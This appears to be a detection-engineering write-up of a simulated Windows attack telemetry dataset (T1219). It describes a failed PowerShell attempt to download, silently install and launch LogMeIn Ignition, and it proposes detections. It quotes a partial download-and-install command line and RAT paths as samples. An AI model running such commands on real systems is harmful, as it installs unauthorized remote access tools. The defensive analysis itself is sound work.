# T1219-3: Remote Access Tools — LogMeIn Files Detected Test on Windows

## Technique Context

T1219 (Remote Access Tools) involves adversaries using legitimate remote access software to maintain persistence and conduct lateral movement. Unlike custom backdoors, RATs leverage trusted software that may be pre-installed or easily justified in corporate environments. LogMeIn is a popular commercial remote access solution that provides screen sharing, file transfer, and remote control capabilities. Attackers often deploy legitimate RATs because they blend with normal business operations, bypass application whitelisting, and may not trigger security alerts. The detection community typically focuses on identifying unauthorized installations, unusual network patterns, or RAT usage outside normal business hours or by unauthorized users.

## What This Dataset Contains

This dataset captures a failed attempt to download and install LogMeIn Ignition via PowerShell. The key events include:

- **PowerShell Script Execution**: Security event 4688 shows PowerShell spawning with command line `"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi...`
- **DNS Resolution**: Sysmon event 22 captures DNS query for `secure.logmein.com` resolving to `158.120.28.133`
- **Download Failure**: PowerShell events 4100 and 4103 show `Invoke-WebRequest` failing with "Could not find a part of the path 'C:\Users\ACME-WS02$\Desktop\LogMeInIgnition.msi'" because the SYSTEM account's Desktop directory doesn't exist
- **Installation Attempts**: Multiple PowerShell errors show `Start-Process` failing to execute the non-existent MSI file and then attempting to launch `'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe'`
- **Process Creation**: Sysmon event 1 shows `whoami.exe` execution as part of initial reconnaissance
- **Network Activity**: Urlmon.dll loads indicate web request preparation

The PowerShell script block logging (event 4104) captures the complete attack script attempting to download LogMeInIgnition.msi, install it silently with `/quiet`, and launch the LogMeIn client.

## What This Dataset Does Not Contain

This dataset lacks several critical elements due to the failed execution:

- **Successful File Download**: The MSI file was never downloaded due to path resolution issues with the SYSTEM account
- **Installation Artifacts**: No MSI installation events, service creation, or registry modifications occurred
- **Network Connections**: No successful HTTPS connections to LogMeIn servers beyond DNS resolution
- **RAT Execution**: The LogMeIn client never launched, so no remote access session telemetry is present
- **Persistence Mechanisms**: No startup items, scheduled tasks, or service installations that would indicate successful RAT deployment

The technique effectively failed at the first step due to environmental issues (SYSTEM account lacking a Desktop folder), providing only preparation and attempt telemetry rather than successful RAT deployment.

## Assessment

This dataset provides moderate value for detection engineering focused on RAT deployment attempts rather than successful installations. The PowerShell command-line logging and script block capture are excellent for building detections around suspicious remote access tool downloads. The DNS resolution to LogMeIn infrastructure is valuable for network-based detection. However, the lack of successful installation limits its utility for understanding complete RAT deployment chains, persistence mechanisms, or operational telemetry. The data is most useful for detecting early-stage RAT deployment attempts and building preventive controls rather than post-compromise detection.

## Detection Opportunities Present in This Data

1. **PowerShell RAT Download Detection**: Monitor Security event 4688 for PowerShell processes with command lines containing `Invoke-WebRequest` combined with known RAT domains like `secure.logmein.com`

2. **RAT Domain DNS Queries**: Alert on DNS queries to known commercial RAT domains (`secure.logmein.com`, `teamviewer.com`, etc.) from non-administrative systems or outside business hours

3. **Remote Access Tool Installation Patterns**: Detect PowerShell script blocks (event 4104) containing patterns like silent MSI installation (`/quiet`) combined with remote access software names

4. **Suspicious File Download Locations**: Monitor for web downloads attempting to save files to user Desktop directories, especially from SYSTEM or service accounts

5. **Failed Installation Reconnaissance**: Correlate `whoami.exe` execution with subsequent PowerShell web requests as potential RAT deployment preparation

6. **Commercial RAT Executable Paths**: Build detections for attempts to execute common RAT client paths like `C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe` from unexpected processes

7. **PowerShell Error Pattern Analysis**: Monitor PowerShell error events (4100) mentioning commercial RAT software names or installation failures that may indicate blocked deployment attempts
